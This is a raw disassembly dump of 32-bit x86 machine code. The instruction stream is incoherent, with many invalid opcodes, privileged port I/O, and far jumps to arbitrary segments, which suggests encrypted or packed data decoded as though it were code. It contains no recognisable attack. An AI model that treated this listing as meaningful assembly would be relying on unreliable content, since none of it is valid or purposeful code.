  419536:	sub    esp,DWORD PTR [ebp-0xced55fb]
  41953c:	je     0x41956e
  41953e:	sub    esp,esi
  419540:	push   DWORD PTR [edx+0x4f30fe8c]
  419546:	inc    esp
  419547:	mov    al,0xf8
  419549:	add    eax,0xc1ad7e2
  41954e:	or     edx,esp
  419550:	pop    esi
  419551:	mov    edi,0x7988b2d3
  419556:	jecxz  0x41952c
  419558:	and    DWORD PTR ds:0x7f56a6d7,edi
  41955e:	add    cl,bh
  419560:	jnp    0x4195a7
  419562:	fwait
  419563:	inc    ebx
  419564:	pop    ebx
  419565:	ins    BYTE PTR es:[edi],dx
  419566:	sbb    DWORD PTR [eax-0xa4f6d16],edx
  41956c:	sub    eax,0x6b2e75c3
  419571:	push   ebp
  419572:	mov    bh,0x84
  419574:	sub    al,0xa0
  419576:	and    al,0xba
  419578:	cld    
  419579:	xor    BYTE PTR [edi+edi*4-0x67],0x3f
  41957e:	rol    bl,0x51
  419581:	xor    esi,edi
  419583:	(bad)  
  419584:	push   eax
  419585:	loop   0x419593
  419587:	repz sbb ah,cl
  41958a:	mov    bl,0x3c
  41958c:	sub    bl,BYTE PTR [edi-0x59]
  41958f:	mov    eax,0x4d922e67
  419594:	ins    BYTE PTR es:[edi],dx
  419595:	test   DWORD PTR [ebp+0x72517478],0x7b4304b3
  41959f:	and    edi,esp
  4195a1:	sar    ebp,0xb3
  4195a4:	push   edx
  4195a5:	fcom   DWORD PTR [ebx-0x37]
  4195a8:	jne    0x419562
  4195aa:	shl    DWORD PTR [ecx-0x68],cl
  4195ad:	push   ebp
  4195ae:	add    BYTE PTR [ebx-0x12],al
  4195b1:	mov    al,ds:0xb68e66f0
  4195b6:	sub    BYTE PTR [esi],bl
  4195b8:	sti    
  4195b9:	xor    al,BYTE PTR ss:[eax]
  4195bc:	cmp    eax,0xce5265ec
  4195c1:	cmp    DWORD PTR [edx],esp
  4195c3:	outs   dx,BYTE PTR ds:[esi]
  4195c4:	cli    
  4195c5:	out    dx,al
  4195c6:	inc    esi
  4195c7:	cmp    DWORD PTR [ebx+0x59],esi
  4195ca:	or     al,0x37
  4195cc:	es push edx
  4195ce:	ds xchg esi,eax
  4195d0:	or     edi,DWORD PTR [ebx+0xb]
  4195d3:	cdq    
  4195d4:	xor    eax,0xb10f72e0
  4195d9:	push   edx
  4195da:	icebp  
  4195db:	stc    
  4195dc:	jae    0x41955e
  4195de:	inc    ecx
  4195df:	sti    
  4195e0:	mov    ch,0xab
  4195e2:	sub    eax,0x29a9e906
  4195e7:	rol    BYTE PTR [edi],1
  4195e9:	jle    0x419664
  4195eb:	add    dl,BYTE PTR [esi+0x66e42779]
  4195f1:	retf   
  4195f2:	adc    ebx,DWORD PTR [esi+edx*2]
  4195f5:	mov    dl,BYTE PTR [esi]
  4195f7:	push   esi
  4195f8:	add    BYTE PTR [ecx+0x25],ah
  4195fb:	mov    eax,esp
  4195fd:	imul   esi,DWORD PTR [edi-0x33ef798c],0x3669783
  419607:	sub    dh,BYTE PTR [ecx]
  419609:	sub    edi,DWORD PTR [edi-0x50751077]
  41960f:	jno    0x4195f9
  419611:	and    al,al
  419613:	xor    al,0xb0
  419615:	push   esp
  419616:	mov    ecx,0xb4c707fa
  41961b:	mov    dl,BYTE PTR [edx+0x52]
  41961e:	inc    ecx
  41961f:	dec    edx
  419620:	sbb    eax,0xef199ad
  419625:	push   ss
  419626:	int    0x9e
  419628:	jo     0x4195b3
  41962a:	ins    DWORD PTR es:[edi],dx
  41962b:	repz int 0xa5
  41962e:	rol    edi,1
  419630:	in     eax,dx
  419631:	sub    bh,BYTE PTR [ebx-0x4a1648e]
  419637:	loope  0x41967a
  419639:	xor    DWORD PTR [ecx+0x3251fc02],0xffffff85
  419640:	or     dl,BYTE PTR [edi+0x42]
  419643:	xor    al,0x25
  419645:	pusha  
  419646:	clc    
  419647:	pusha  
  419648:	xor    ebx,DWORD PTR ds:0xc01d9263
  41964e:	mov    al,ds:0xafca8e3a
  419653:	mov    ds:0xa97a30ee,eax
  419658:	fistp  QWORD PTR [ecx+0x1f]
  41965b:	add    ah,dl
  41965d:	icebp  
  41965e:	mov    ds:0xbbfb6ccb,al
  419663:	dec    edi
  419664:	popf   
  419665:	jnp    0x419637
  419667:	je     0x4195fb
  419669:	mov    ds:0x9409b35c,al
  41966e:	pop    eax
  41966f:	push   esi
  419670:	mov    ds:0x20b8a00c,eax
  419675:	dec    eax
  419676:	sbb    BYTE PTR [ebx],ch
  419678:	sbb    edi,ebx
  41967a:	pop    es
  41967b:	es addr16 mov ebp,0xe00dd115
  419682:	push   0x1bcbc54d
  419687:	ror    BYTE PTR [ecx-0x45],1
  41968a:	scas   eax,DWORD PTR es:[edi]
  41968b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41968c:	jg     0x419694
  41968e:	inc    ebp
  41968f:	shl    DWORD PTR [ecx+0x1b],1
  419692:	arpl   WORD PTR [esi-0x5b],bx
  419695:	push   edx
  419696:	es inc ebx
  419698:	push   0xc8653fe7
  41969d:	or     ebx,DWORD PTR [ebx+ebx*1-0x6e]
  4196a1:	std    
  4196a2:	push   ebx
  4196a3:	xor    DWORD PTR [esi+0xb8226d],edx
  4196a9:	or     eax,0x3929dbf2
  4196ae:	pop    ds
  4196af:	les    esp,FWORD PTR ds:0x8c2ba146
  4196b5:	and    DWORD PTR [esi],esp
  4196b7:	mov    al,0x23
  4196b9:	lods   eax,DWORD PTR ds:[esi]
  4196ba:	xor    eax,0x991ff7cd
  4196bf:	jnp    0x4196fe
  4196c1:	(bad)  
  4196c2:	rcr    ecx,1
  4196c4:	sub    ch,0x8b
  4196c7:	lea    esi,[esp+ecx*8+0x380f3a53]
  4196ce:	cli    
  4196cf:	mov    ah,0x74
  4196d1:	int    0x5b
  4196d3:	imul   edi,DWORD PTR [edi+0x406f288f],0xffffffe6
  4196da:	shl    ecx,0x48
  4196dd:	stc    
  4196de:	ret    0x2454
  4196e1:	iret   
  4196e2:	sti    
  4196e3:	sbb    BYTE PTR [edi+0x5fcbbeb3],0xbd
  4196ea:	jbe    0x41969a
  4196ec:	xchg   ebx,eax
  4196ed:	or     eax,0xc227310e
  4196f2:	pop    edx
  4196f3:	mov    edx,0x404f4d89
  4196f8:	xchg   edi,eax
  4196f9:	sar    BYTE PTR [edi-0x26],1
  4196fc:	or     al,0x63
  4196fe:	mov    cl,0x4
  419700:	leave  
  419701:	fstp   QWORD PTR [edi+0x41]
  419704:	das    
  419705:	jae    0x4196f0
  419707:	xlat   BYTE PTR ds:[ebx]
  419708:	stos   DWORD PTR es:[edi],eax
  419709:	pop    eax
  41970a:	ret    
  41970b:	aam    0xa6
  41970d:	stc    
  41970e:	pop    ss
  41970f:	add    BYTE PTR ds:0x79777aec,bl
  419715:	scas   eax,DWORD PTR es:[edi]
  419716:	sbb    eax,0xfb2941de
  41971b:	les    ebx,FWORD PTR [edx+0x648b909d]
  419721:	fwait
  419722:	outs   dx,DWORD PTR ds:[esi]
  419723:	mov    esi,0x8996a1dd
  419728:	int    0x7
  41972a:	xor    DWORD PTR [edi],ebx
  41972c:	pop    ecx
  41972d:	rcl    dl,0x4
  419730:	enter  0xeaa7,0x7c
  419734:	outs   dx,BYTE PTR ds:[esi]
  419735:	sbb    edx,edi
  419737:	dec    ebp
  419738:	test   DWORD PTR [esi],ebx
  41973a:	jge    0x419789
  41973c:	add    BYTE PTR [ebx+ebx*4+0xd338ef8],0x20
  419744:	pop    edx
  419745:	nop
  419746:	xchg   esp,eax
  419747:	sti    
  419748:	jae    0x4197c0
  41974a:	addr16 cvttps2pi mm0,xmm0
  41974e:	push   edx
  41974f:	pop    esi
  419750:	mov    cl,bl
  419752:	add    al,0x34
  419754:	inc    edi
  419755:	inc    esi
  419756:	(bad)  
  419757:	out    dx,al
  419758:	inc    BYTE PTR [edi]
  41975a:	push   ss
  41975b:	sbb    eax,DWORD PTR [edx]
  41975d:	ret    
  41975e:	pop    ecx
  41975f:	int    0x30
  419761:	stc    
  419762:	(bad)  
  419764:	call   FWORD PTR [esi-0x427fe5a9]
  41976a:	xchg   esi,eax
  41976b:	cdq    
  41976c:	xchg   edi,eax
  41976d:	je     0x4197d9
  41976f:	mov    edx,0xfd765e0c
  419774:	xlat   BYTE PTR ds:[ebx]
  419775:	addr16 data16 aad 0xf1
  419779:	push   0x5c
  41977b:	add    ch,BYTE PTR [edx]
  41977d:	or     dl,dl
  41977f:	mov    esi,0x24417ce7
  419784:	fstp   st(6)
  419786:	sbb    BYTE PTR [ebx],0x47
  419789:	mov    al,0xfb
  41978b:	mov    DWORD PTR [ecx],eax
  41978d:	inc    edi
  41978e:	ret    0x848f
  419791:	int    0x74
  419793:	ret    0x6800
  419796:	mov    ah,0x1e
  419798:	retf   
  419799:	jg     0x419790
  41979b:	aaa    
  41979c:	inc    ebp
  41979d:	pusha  
  41979e:	std    
  41979f:	repz addr16 loop 0x4197ad
  4197a3:	out    0x88,al
  4197a5:	popf   
  4197a6:	sub    al,0xd8
  4197a8:	in     al,0x94
  4197aa:	and    edx,esp
  4197ac:	add    ch,BYTE PTR [ebx]
  4197ae:	cmp    DWORD PTR [eax],esp
  4197b0:	mov    esp,DWORD PTR [ebx]
  4197b2:	pop    es
  4197b3:	out    0x44,eax
  4197b5:	das    
  4197b6:	xchg   ebp,eax
  4197b7:	add    al,0xe3
  4197b9:	push   edx
  4197ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197bb:	in     eax,0x2
  4197bd:	sub    BYTE PTR [edx+ebp*1],ch
  4197c0:	retf   0x3ef0
  4197c3:	cmp    esp,DWORD PTR [ecx-0x80]
  4197c6:	inc    esp
  4197c7:	cmp    BYTE PTR [esi],ah
  4197c9:	test   al,0x90
  4197cb:	adc    al,0x6b
  4197cd:	push   ebx
  4197ce:	mov    esi,DWORD PTR [eax-0x7389171c]
  4197d4:	addr16 mov dl,0xc5
  4197d7:	or     DWORD PTR [edx-0x626f645f],edi
  4197dd:	(bad)  
  4197de:	jo     0x41985d
  4197e0:	jmp    0x1a75:0x70e97dc8
  4197e7:	mov    esp,DWORD PTR [eax]
  4197e9:	push   ss
  4197ea:	dec    edi
  4197eb:	aas    
  4197ec:	or     al,0x1c
  4197ee:	push   ecx
  4197ef:	mov    ds:0xd77b1667,al
  4197f4:	adc    eax,0xefa32e7a
  4197f9:	and    DWORD PTR [ebp+0x77],ebx
  4197fc:	sahf   
  4197fd:	jp     0x419781
  4197ff:	int3   
  419800:	lea    esp,[ebp+0x5b]
  419803:	mov    eax,0xc5529668
  419808:	and    cl,ch
  41980a:	fmul   DWORD PTR [eax*2-0x3b41c8d8]
  419811:	clc    
  419812:	cs mov edi,0xc6f60e07
  419818:	push   ecx
  419819:	das    
  41981a:	dec    ebp
  41981b:	imul   ebp,DWORD PTR [esi-0xe764fdf],0x7ae3bb6f
  419825:	xor    DWORD PTR [ecx+0x74],0x7e79717f
  41982c:	rcl    DWORD PTR [edi-0x1e0d1235],cl
  419832:	arpl   WORD PTR [ebx+ebx*4+0x66],bx
  419836:	mov    dh,0xa3
  419838:	lds    edi,FWORD PTR [edx-0x61]
  41983b:	cwde   
  41983c:	ficomp WORD PTR [esi+eax*1+0x8]
  419840:	(bad)  
  419841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419842:	fwait
  419843:	scas   eax,DWORD PTR es:[edi]
  419844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419845:	stc    
  419846:	mov    ecx,0xdde812ce
  41984b:	mov    ds:0x9ebfaf80,eax
  419850:	and    esi,DWORD PTR [ebp+0x20357c1a]
  419856:	mov    BYTE PTR [ecx-0xc],dh
  419859:	retf   0x12aa
  41985c:	scas   al,BYTE PTR es:[edi]
  41985d:	(bad)  
  41985e:	les    ebx,FWORD PTR [esi-0x326e71f]
  419864:	fdivr  QWORD PTR [eax+0x40e1ee8f]
  41986a:	and    DWORD PTR [edx+edx*4+0x7f],0x6f
  41986f:	loop   0x41988d
  419871:	fs (bad) 
  419873:	fcom   QWORD PTR [edx-0x37]
  419876:	cdq    
  419877:	xchg   ebx,eax
  419878:	xchg   ch,bl
  41987a:	adc    edi,DWORD PTR [ebp+0x5e]
  41987d:	iret   
  41987e:	cli    
  41987f:	add    ecx,DWORD PTR [edi-0x6f]
  419882:	aaa    
  419883:	pop    esp
  419884:	cmp    edx,eax
  419886:	mov    al,cs:0x561fdde1
  41988c:	(bad)  
  41988d:	jg     0x4198b3
  41988f:	sub    al,BYTE PTR ds:0xf5926334
  419895:	loopne 0x419842
  419897:	push   esp
  419898:	loop   0x419890
  41989a:	jne    0x4198ed
  41989c:	mov    al,0xf9
  41989e:	cmp    eax,0xb4aba1a9
  4198a3:	test   eax,0xcda044ab
  4198a8:	mov    cl,0xb4
  4198aa:	fwait
  4198ab:	ds xchg si,ax
  4198ae:	push   eax
  4198af:	data16 jg 0x419859
  4198b2:	lahf   
  4198b3:	xor    bl,BYTE PTR [esi-0x73]
  4198b6:	xchg   edx,eax
  4198b7:	cmp    al,0x79
  4198b9:	mov    edi,0xe2ac21c3
  4198be:	mov    ebx,0xea97066f
  4198c3:	into   
  4198c4:	push   ecx
  4198c5:	dec    esi
  4198c6:	lock scas al,BYTE PTR es:[edi]
  4198c8:	or     al,BYTE PTR [ecx]
  4198ca:	int3   
  4198cb:	xor    DWORD PTR [eax-0x6f2c4735],0xfffffffe
  4198d2:	lahf   
  4198d3:	jge    0x419870
  4198d5:	push   edx
  4198d6:	retf   
  4198d7:	and    al,0x18
  4198d9:	cmovns ebp,DWORD PTR [ebp-0x38a943ea]
  4198e0:	fcomp  QWORD PTR [edx+0x6]
  4198e3:	test   BYTE PTR [ecx+0x48],0x72
  4198e7:	les    edx,FWORD PTR [eax+esi*2]
  4198ea:	add    ecx,DWORD PTR [esp+ecx*8+0x341761eb]
  4198f1:	aam    0x25
  4198f3:	xchg   edi,eax
  4198f4:	clc    
  4198f5:	jno    0x419973
  4198f7:	mov    eax,eax
  4198f9:	xor    esp,DWORD PTR [ecx-0x6c]
  4198fc:	jo     0x419912
  4198fe:	xchg   ebx,eax
  4198ff:	add    al,0xe5
  419901:	mov    ecx,0xc7a4ea4f
  419906:	cmc    
  419907:	mov    ch,0xef
  419909:	sub    DWORD PTR [esi],esp
  41990b:	and    dl,BYTE PTR [ebp+0x43]
  41990e:	sbb    ecx,DWORD PTR [edi]
  419910:	stc    
  419911:	jecxz  0x4198c3
  419913:	test   BYTE PTR [edx-0x75338708],dl
  419919:	jmp    0x60bd0bf7
  41991e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41991f:	mov    bh,0x4e
  419921:	(bad)  
  419922:	jl     0x4198fb
  419924:	rcr    BYTE PTR [ebx],0x54
  419927:	xchg   esi,eax
  419928:	test   al,0x47
  41992a:	jge    0x4198ec
  41992c:	(bad)  
  41992d:	cmp    ah,BYTE PTR [eax-0x391c81fe]
  419933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419934:	jle    0x41991b
  419936:	icebp  
  419937:	aad    0x24
  419939:	mov    al,dh
  41993b:	es add al,0x14
  41993e:	(bad)  
  419940:	shl    ah,cl
  419942:	icebp  
  419943:	cmp    DWORD PTR gs:[eax+edx*8-0x46],0x3c
  419949:	in     al,0x99
  41994b:	(bad)  
  41994c:	cdq    
  41994d:	mov    ch,0xd7
  41994f:	pop    edx
  419950:	(bad)  
  419951:	push   ecx
  419952:	popa   
  419953:	push   cs
  419954:	int    0x7
  419956:	(bad)  
  419957:	hlt    
  419958:	sbb    ebp,ecx
  41995a:	or     esi,esi
  41995c:	push   esi
  41995d:	leave  
  41995e:	shr    DWORD PTR [ebp+eiz*4+0x6af03632],1
  419965:	add    BYTE PTR [ebp+0xdd51c39],0x6c
  41996c:	adc    dh,BYTE PTR [edx+edx*8+0x77]
  419970:	cdq    
  419971:	test   al,0xe8
  419973:	sbb    sp,WORD PTR [ebp-0x1f1c053d]
  41997a:	lds    ebx,FWORD PTR [eax-0x40]
  41997d:	ficom  DWORD PTR [edi]
  41997f:	xor    BYTE PTR [eax+0x3],ch
  419982:	cmp    bl,BYTE PTR [esp+edx*1+0x3a249261]
  419989:	jp     0x419990
  41998b:	in     eax,0xbc
  41998d:	dec    esp
  41998e:	adc    eax,0xd1a77657
  419993:	dec    eax
  419994:	not    DWORD PTR [ebx+0x2e]
  419997:	dec    ebp
  419998:	xchg   BYTE PTR [eax-0x12],bl
  41999b:	push   ebx
  41999c:	loope  0x419953
  41999e:	add    eax,0xc8f5ecbb
  4199a3:	mov    esp,0x3d108b82
  4199a8:	or     BYTE PTR [esi-0x22e6b768],cl
  4199ae:	aam    0x6d
  4199b0:	cmc    
  4199b1:	mov    ebx,ebp
  4199b3:	push   cs
  4199b4:	das    
  4199b5:	ret    
  4199b6:	lea    edi,[esi+0x717f6bfc]
  4199bc:	test   BYTE PTR [ecx-0x56f7eb55],bh
  4199c2:	xlat   BYTE PTR ds:[ebx]
  4199c3:	les    ebx,FWORD PTR [edi]
  4199c5:	cdq    
  4199c6:	(bad)  
  4199c7:	shl    eax,cl
  4199c9:	cli    
  4199ca:	pop    ebx
  4199cb:	sub    esp,DWORD PTR [ecx+0x48]
  4199ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199cf:	sub    DWORD PTR [ecx+0x507f6a69],ebx
  4199d5:	pop    esp
  4199d6:	ins    BYTE PTR es:[edi],dx
  4199d7:	jb     0x4199a1
  4199d9:	cmp    al,0x33
  4199db:	and    cl,BYTE PTR [edi+0x34dbcede]
  4199e1:	push   ss
  4199e2:	inc    edi
  4199e3:	xchg   ebx,eax
  4199e4:	jp     0x41996f
  4199e6:	cmp    al,ah
  4199e8:	adc    bl,BYTE PTR [ebx+0x50773096]
  4199ee:	jns    0x4199a0
  4199f0:	lods   eax,DWORD PTR ds:[esi]
  4199f1:	xor    eax,0x9e0e0f57
  4199f6:	add    al,0x8d
  4199f8:	xor    eax,0x768e72bd
  4199fd:	clc    
  4199fe:	leave  
  4199ff:	sbb    cl,BYTE PTR [edx-0x1232ceb1]
  419a05:	call   0xf23a:0x8bb79881
  419a0c:	js     0x4199fa
  419a0e:	enter  0xa561,0x18
  419a12:	xlat   BYTE PTR ds:[ebx]
  419a13:	stos   DWORD PTR es:[edi],eax
  419a14:	xor    eax,0x88b70b77
  419a19:	fstp   QWORD PTR [ebx-0x62fe1da]
  419a1f:	mul    DWORD PTR [ebx-0x1f]
  419a22:	dec    eax
  419a23:	cmp    al,0x22
  419a25:	inc    edx
  419a26:	ret    
  419a27:	or     BYTE PTR [esi+0x3a],bh
  419a2a:	mov    cl,0x40
  419a2c:	ret    0x457a
  419a2f:	ret    
  419a30:	jnp    0x419a5b
  419a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a33:	cmovne edi,ecx
  419a36:	sti    
  419a37:	jg     0x419a36
  419a39:	sti    
  419a3a:	ror    BYTE PTR [eax-0x10],0x5
  419a3e:	in     eax,0x48
  419a40:	cmp    BYTE PTR fs:[esi+0x4cd96701],cl
  419a47:	lea    ecx,[ebp+0x57]
  419a4a:	loopne 0x4199cd
  419a4c:	or     BYTE PTR [ebx],al
  419a4e:	leave  
  419a4f:	aas    
  419a50:	in     eax,dx
  419a51:	shl    BYTE PTR [ebx+0x1908c7e7],1
  419a57:	pop    ecx
  419a58:	scas   al,BYTE PTR es:[edi]
  419a59:	push   esp
  419a5a:	adc    dl,BYTE PTR [edx-0x3cd967aa]
  419a60:	and    BYTE PTR [ebx-0x2e],0x1c
  419a64:	enter  0xbe7f,0x74
  419a68:	push   es
  419a69:	xor    dh,BYTE PTR [edi-0x673a9083]
  419a6f:	ins    BYTE PTR es:[edi],dx
  419a70:	scas   eax,DWORD PTR es:[edi]
  419a71:	sub    bl,bh
  419a73:	add    eax,0x61852444
  419a78:	sbb    eax,ebx
  419a7a:	mov    ecx,0x2188e7ec
  419a7f:	les    edx,FWORD PTR gs:[ecx+0x3c]
  419a83:	add    ebp,ebx
  419a85:	shl    BYTE PTR [esi],0x11
  419a88:	lea    eax,[eax+edx*2]
  419a8b:	push   esi
  419a8c:	and    al,0xe7
  419a8e:	dec    ebp
  419a8f:	adc    eax,0x42ca5dac
  419a94:	out    0xca,al
  419a96:	xchg   edx,eax
  419a97:	ror    BYTE PTR [ebx-0x33],cl
  419a9a:	outs   dx,BYTE PTR ds:[esi]
  419a9b:	xor    DWORD PTR [edx-0x27760c01],0x89199a26
  419aa5:	xor    DWORD PTR [edi+0x9424379],ecx
  419aab:	les    eax,FWORD PTR [edi+esi*2]
  419aae:	jmp    0x1f65:0x9e201245
  419ab5:	inc    edi
  419ab6:	test   eax,0x9eead072
  419abb:	pop    es
  419abc:	ins    DWORD PTR es:[edi],dx
  419abd:	arpl   WORD PTR [edi+0x6ce194e1],cx
  419ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ac4:	mov    esi,0x25e895e
  419ac9:	jle    0x419ad2
  419acb:	test   al,0xc4
  419acd:	sar    BYTE PTR [eax-0x1b],1
  419ad0:	add    cl,bl
  419ad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ad3:	icebp  
  419ad4:	clc    
  419ad5:	inc    ecx
  419ad6:	xchg   ebp,eax
  419ad7:	mov    ah,0xd8
  419ad9:	call   0x7134312c
  419ade:	push   ecx
  419adf:	retf   
  419ae0:	clc    
  419ae1:	xchg   esi,eax
  419ae2:	addr16 pop ds
  419ae4:	dec    ebx
  419ae5:	mov    bh,0x55
  419ae7:	adc    eax,0x6876b15a
  419aec:	in     eax,dx
  419aed:	push   es
  419aee:	das    
  419aef:	mov    cl,0x9e
  419af1:	adc    BYTE PTR [eax+0x551a607c],0xb0
  419af8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419af9:	push   ss
  419afa:	or     DWORD PTR [ebx],0xffffffd7
  419afd:	push   0xffffff9c
  419aff:	out    dx,al
  419b00:	sub    cl,BYTE PTR [esi-0xc]
  419b03:	(bad)  
  419b04:	outs   dx,BYTE PTR ds:[esi]
  419b05:	inc    edi
  419b06:	or     edi,eax
  419b08:	jbe    0x419ade
  419b0a:	xchg   BYTE PTR [eax-0x3],al
  419b0d:	inc    edi
  419b0e:	daa    
  419b0f:	push   esp
  419b10:	dec    ecx
  419b11:	lods   al,BYTE PTR ds:[esi]
  419b12:	inc    edx
  419b13:	push   esp
  419b14:	outs   dx,DWORD PTR ds:[esi]
  419b15:	fst    QWORD PTR [ebp+0x7ca2044]
  419b1b:	call   0x4b63:0xed4878fe
  419b22:	fadd   st(2),st
  419b24:	mov    esp,0xb7d33828
  419b29:	add    esp,DWORD PTR [eax-0x731901cb]
  419b2f:	adc    al,0xfe
  419b31:	shl    DWORD PTR [edi],0xba
  419b34:	data16 neg BYTE PTR [ebx]
  419b37:	and    DWORD PTR ds:0x9e185332,esp
  419b3d:	fdivrp st(6),st
  419b3f:	mov    ebp,0xeb715ae2
  419b44:	popf   
  419b45:	mov    dl,0x2a
  419b47:	dec    edx
  419b48:	sbb    ebx,DWORD PTR [ecx]
  419b4a:	clc    
  419b4b:	test   esp,0x6abf46c5
  419b51:	jo     0x419b82
  419b53:	scas   al,BYTE PTR es:[edi]
  419b54:	mov    ds:0x72f791c0,eax
  419b59:	inc    ecx
  419b5a:	je     0x419b61
  419b5c:	ins    DWORD PTR es:[edi],dx
  419b5d:	outs   dx,BYTE PTR ds:[esi]
  419b5e:	lods   al,BYTE PTR ds:[esi]
  419b5f:	and    dl,BYTE PTR ds:0xd2de72c5
  419b65:	(bad)  [esp+ebp*4+0x12f5e92]
  419b6c:	mov    esi,0x1fff4ced
  419b71:	pusha  
  419b72:	dec    ebx
  419b73:	inc    eax
  419b74:	outs   dx,DWORD PTR ds:[esi]
  419b75:	sbb    eax,ecx
  419b77:	in     al,dx
  419b78:	dec    ebp
  419b79:	ins    BYTE PTR es:[edi],dx
  419b7a:	dec    edx
  419b7b:	or     eax,0xd4f78d71
  419b80:	sti    
  419b81:	dec    edx
  419b82:	es test al,0x9
  419b85:	ficom  WORD PTR [edx]
  419b87:	rol    BYTE PTR [edx],0xd5
  419b8a:	and    BYTE PTR [ebp-0x7fa556fb],ah
  419b90:	aad    0xdc
  419b92:	idiv   BYTE PTR [edi-0x67]
  419b95:	test   eax,0xa6b45b3b
  419b9a:	rcl    ecx,0x9e
  419b9d:	and    BYTE PTR [edx-0x2c],bh
  419ba0:	or     DWORD PTR [ebp+ebx*2+0x5fc8307],ebp
  419ba7:	dec    eax
  419ba8:	and    eax,0x5dbb09ff
  419bad:	in     al,dx
  419bae:	sub    ah,BYTE PTR [ebx-0x5f2bff76]
  419bb4:	dec    esp
  419bb5:	or     edi,DWORD PTR [ebx-0x6]
  419bb8:	cmp    edx,DWORD PTR [ebx+0x26]
  419bbb:	dec    edi
  419bbc:	outs   dx,DWORD PTR ds:[esi]
  419bbd:	enter  0x6452,0xd6
  419bc1:	pop    ebx
  419bc2:	jbe    0x419bdf
  419bc4:	adc    dh,dh
  419bc6:	xchg   ecx,eax
  419bc7:	test   BYTE PTR [esp+esi*2-0x27f1c7f6],0x63
  419bcf:	dec    ebp
  419bd0:	jge    0x419b85
  419bd2:	mov    edi,0x41d7fd9d
  419bd7:	pop    ebp
  419bd8:	or     eax,0x2ce7c747
  419bdd:	pop    ss
  419bde:	mov    al,ds:0x7c81cbe1
  419be3:	push   esp
  419be4:	call   0xa7ee9231
  419be9:	cmp    DWORD PTR [ecx],ebx
  419beb:	dec    edx
  419bec:	pop    ebx
  419bed:	dec    edx
  419bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bef:	mov    esp,0xb5eaef7c
  419bf4:	out    dx,al
  419bf5:	xor    eax,DWORD PTR [ecx-0x3ff1213a]
  419bfb:	xchg   ch,dl
  419bfd:	iret   
  419bfe:	push   esp
  419bff:	dec    ebp
  419c00:	pop    ecx
  419c01:	out    0xfa,al
  419c03:	jmp    0x419c11
  419c05:	mov    al,0xb4
  419c07:	add    eax,0xffffffb4
  419c0a:	ins    DWORD PTR es:[edi],dx
  419c0b:	jecxz  0x419c21
  419c0d:	popa   
  419c0e:	clc    
  419c0f:	pop    ecx
  419c10:	mov    dl,0x4c
  419c12:	mov    bl,0x22
  419c14:	dec    eax
  419c15:	xchg   esi,eax
  419c16:	vmwrite ebx,DWORD PTR [ebx-0x33aa2269]
  419c1d:	cmc    
  419c1e:	not    BYTE PTR [ebx+0x43a53ee2]
  419c24:	enter  0x9fa3,0xac
  419c28:	ins    WORD PTR es:[edi],dx
  419c2a:	outs   dx,BYTE PTR ds:[esi]
  419c2b:	pop    ss
  419c2c:	mov    esp,0xe1b332e0
  419c31:	das    
  419c32:	ficom  WORD PTR [esi+0x35]
  419c35:	out    0x37,eax
  419c37:	je     0x419be1
  419c39:	mov    bl,0x1e
  419c3b:	fstp   st(0)
  419c3d:	stc    
  419c3e:	mov    eax,ds:0x55ce967f
  419c43:	fisubr DWORD PTR [eax+0x50]
  419c46:	mov    bl,0x2c
  419c48:	mov    bh,0x27
  419c4a:	add    ah,BYTE PTR [edi+0x47]
  419c4d:	stos   DWORD PTR es:[edi],eax
  419c4e:	call   0x2eb982d8
  419c53:	mov    eax,ds:0x69552caf
  419c58:	test   eax,0x9e19a6c4
  419c5d:	in     al,dx
  419c5e:	mov    ebp,0x16bd2747
  419c63:	xchg   edx,eax
  419c64:	js     0x419bef
  419c66:	sbb    eax,0x4518a280
  419c6b:	inc    esi
  419c6c:	enter  0x75b4,0xee
  419c70:	int3   
  419c71:	push   edi
  419c72:	stos   DWORD PTR es:[edi],eax
  419c73:	and    ch,BYTE PTR [edx]
  419c75:	mov    ds:0xd16d95a7,al
  419c7a:	imul   esi,DWORD PTR [ebp-0x5e1e3e88],0x35
  419c81:	in     eax,0x6b
  419c83:	rol    cl,0x28
  419c86:	cmp    esp,0xfffffff8
  419c89:	jnp    0x419c42
  419c8b:	pusha  
  419c8c:	mov    edi,?
  419c8e:	sub    ah,ch
  419c90:	adc    bl,BYTE PTR [edi+0x152856b1]
  419c96:	ret    0xd63e
  419c99:	call   0x2eaee6e1
  419c9e:	or     cl,dl
  419ca0:	retf   0xad7d
  419ca3:	mov    edx,0x355dac33
  419ca8:	adc    al,0xd5
  419caa:	js     0x419cf0
  419cac:	je     0x419c47
  419cae:	jmp    0x7a95fe08
  419cb3:	jo     0x419cf9
  419cb5:	push   eax
  419cb6:	xor    DWORD PTR [esi+ecx*8-0x79],eax
  419cba:	jmp    FWORD PTR [eax+ecx*1-0x28]
  419cbe:	push   0x7aca33e7
  419cc3:	cld    
  419cc4:	sbb    eax,0xa15aa666
  419cc9:	repnz cli 
  419ccb:	pusha  
  419ccc:	and    eax,0x68b014e0
  419cd1:	push   ebp
  419cd2:	cmc    
  419cd3:	iret   
  419cd4:	mov    dh,0xbb
  419cd6:	cmp    DWORD PTR [edx+0x1d02c31b],esp
  419cdc:	aam    0xb2
  419cde:	pop    ecx
  419cdf:	inc    eax
  419ce0:	aaa    
  419ce1:	out    dx,al
  419ce2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  419ce4:	retf   0x4e0e
  419ce7:	fidivr DWORD PTR [ebx]
  419ce9:	pop    edx
  419cea:	add    eax,0xca80c73
  419cef:	out    0xda,al
  419cf1:	xchg   ecx,eax
  419cf2:	mov    ecx,0x1f7db791
  419cf7:	dec    edx
  419cf8:	adc    edx,0x408b03c9
  419cfe:	inc    esp
  419cff:	inc    ecx
  419d00:	fistp  WORD PTR [esi+eax*1-0x36]
  419d04:	mov    ch,0x61
  419d06:	fucomip st,st(1)
  419d08:	and    eax,0xd230de3c
